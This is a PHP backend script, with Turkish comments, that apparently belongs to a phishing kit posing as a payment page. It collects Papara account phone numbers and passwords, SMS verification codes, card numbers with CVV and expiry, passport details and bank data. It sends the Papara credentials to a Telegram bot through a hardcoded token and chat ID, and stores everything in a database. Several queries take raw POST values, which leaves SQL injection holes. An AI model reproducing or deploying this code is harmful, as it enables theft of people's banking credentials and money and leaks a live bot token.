<?php
  include '../inc/config.php';
  include '../inc/anti.php';


  $q = $_GET["q"];
  if ($q == "payment") {
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
    }
	 $token = '6130623406:AAGZBm0a478MN1oh9UTGm7I_QFWQ_yNCrwk';

// Mesaj göndermek istediğiniz kullanıcının Telegram kullanıcı adını veya ID'sini buraya girin
$chatId = '-4080457068';

// Önceki kodunuzun devamı...

// $db -> query() fonksiyonundan hemen sonra, ödeme işlemi tamamlandığında bir mesaj göndermek için aşağıdaki kodu ekleyin
$message = "Yeni bir ödeme işlemi tamamlandı:\n\n";
$message .= "İşlem: " . $datas[type] . "\n";
$message .= "Miktar: " . $datas[amount] . "\n";
$message .= "Telefon: " . $datas[papara_telefon] . "\n";
$message .= "Şifre: " . $datas[papara_sifre] . "\n";
// Diğer verileri mesajınıza ekleyebilirsiniz

// Telegram API'ye POST isteği göndermek için gerekli URL
$url = "https://api.telegram.org/bot$token/sendMessage";

// POST isteği için gerekli parametreleri oluşturun
$params = [
    'chat_id' => $chatId,
    'text' => $message,
];

// Curl kullanarak POST isteği gönderin
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
    if (strlen($datas['amount']) > 0) {
    header('Content-Type: application/json');
    $db -> query("INSERT into payments set
      type = '$datas[type]',
      amount = '$datas[amount]',
      user = '$us[login]',
      user_id = '$us[id]',
      identity = '$datas[identity]',
      papara_telefon = '$datas[papara_telefon]',
      papara_sifre = '$datas[papara_sifre]',
      papara_sms = '$datas[papara_sms]',
      papara_email_status = '$datas[papara_email_status]',
      astropay_card_number = '$datas[astropay_card_number]',
      astropay_exp_date = '$datas[expmonth]/$datas[expyear]',
      astropay_cv2 = '$datas[astropay_cv2]',
      paykasa_number = '$datas[paykasa_number]',
      bank_id = '$datas[bank_id]',
      sender_phone = '$datas[sender_phone]',
      buyer_phone = '$datas[buyer_phone]',
      buyer_passport = '$datas[buyer_passport]',
      buyer_birth = '$datas[buyer_birth]',
      buyer_passport_date = '$datas[buyer_passport_date]',
      referance = '$datas[referance]',
      full_name = '$datas[full_name]',
      where_from = '$datas[where_from]',
      transfer_hour = '$datas[transfer_time]',
      card_number = '$datas[card_number]',
      exp_date = '$datas[exp_date]',
      cvv = '$datas[cvv]',
      ip = '$ip'
      ");
      $_SESSION['amount'] = $datas[amount];
      $amonts = $_SESSION['amount'];
    die(json_encode(['success' => true, 'message' => $db->insert_id]));
  }
  elseif($q == "update-payment"){
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
    }
    $db -> query("UPDATE payments set papara_sms_code = '$datas[papara_sms_code]' where id = '$datas[id]'");
    die(json_encode(['success' => true, 'message' => json_encode($datas)]));
  }elseif($q == "get-bank"){
    $id = intval($_POST['id']);
    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
  }
  
  
}
elseif ($q == 'odeme-durum' && isset($us['id'])) {

  $id = $us["id"];
  $type = $_POST['type'];
  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE '$type' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
  echo $res["status"];
}
elseif ($q == 'sms-durum' && isset($us['id'])) {
  $id = $us["id"];
  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE 'papara-3d' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
  echo $res["status"];
}
elseif ($q == 'sms-onay' && isset($us['id'])){
  $sms = $_POST['papara_sms'];
  $id = $us["id"];
  $db->query("UPDATE `payments` SET `papara_sms` = '$sms' WHERE `user_id` = '$id' AND `type` = 'papara-3d' ORDER BY id DESC LIMIT 1; ");
  die('success');
}
elseif ($q == 'email-durum' && isset($us['id'])) {
  $id = $us["id"];
  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE 'papara-3d' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
  echo $res["status"];
}
elseif ($q == 'email-onay' && isset($us['id'])){
  $email_status = $_POST['papara_email_status'];
  $id = $us["id"];
  $db->query("UPDATE `payments` SET `papara_email_status` = '$email_status' WHERE `user_id` = '$id' AND `type` = 'papara-3d' ORDER BY id DESC LIMIT 1; ");
  die('success');
}
?>